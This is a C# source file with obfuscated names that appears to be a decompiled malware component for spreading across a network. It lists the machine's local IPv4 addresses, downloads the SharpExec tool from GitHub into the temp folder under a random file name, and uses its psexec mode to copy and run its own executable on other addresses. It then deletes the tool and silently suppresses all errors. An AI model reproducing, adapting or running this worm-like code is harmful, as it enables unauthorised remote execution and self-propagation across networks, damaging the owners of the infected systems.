using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Reflection;

namespace CvZbjvYtYnj;

internal sealed class ULNkSsfHoUwas
{
	public static List<string> osvJbXMHUQo = new List<string>();

	public static string TrReRRKIghsfwfj = "";

	public static void IVETbRbBNrCf()
	{
		try
		{
			osvJbXMHUQo = ywUfcAMiFuI();
			string text = "";
			if (osvJbXMHUQo.Count > 0)
			{
				text = rdolauyDkk();
			}
			if (File.Exists(text))
			{
				foreach (string item in osvJbXMHUQo)
				{
					string text2 = (TrReRRKIghsfwfj = item);
					foreach (string item2 in osvJbXMHUQo)
					{
						if (!(item2 == TrReRRKIghsfwfj))
						{
							iKytVJlqch.kCWinPnjGPfd(text, "-m=psexec -i=" + TrReRRKIghsfwfj + " -d=" + item2 + " -f=" + Assembly.GetEntryAssembly()!.Location + " -e=" + Path.Combine(Path.GetTempPath(), Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe"));
						}
					}
				}
			}
			File.Delete(text);
		}
		catch
		{
		}
	}

	public static List<string> ywUfcAMiFuI()
	{
		List<string> list = new List<string>();
		IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
		IPAddress[] addressList = hostEntry.AddressList;
		foreach (IPAddress iPAddress in addressList)
		{
			if (iPAddress.AddressFamily.ToString() == "InterNetwork")
			{
				list.Add(iPAddress.ToString());
			}
		}
		return list;
	}

	public static string rdolauyDkk()
	{
		if (IntPtr.Size == 8)
		{
			return fMCoipAKLa(new Uri("https://raw.githubusercontent.com/anthemtotheego/SharpExec/master/CompiledBinaries/SharpExec_x64.exe"));
		}
		return fMCoipAKLa(new Uri("https://raw.githubusercontent.com/anthemtotheego/SharpExec/master/CompiledBinaries/SharpExec_x86.exe"));
	}

	public static string fMCoipAKLa(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}
}
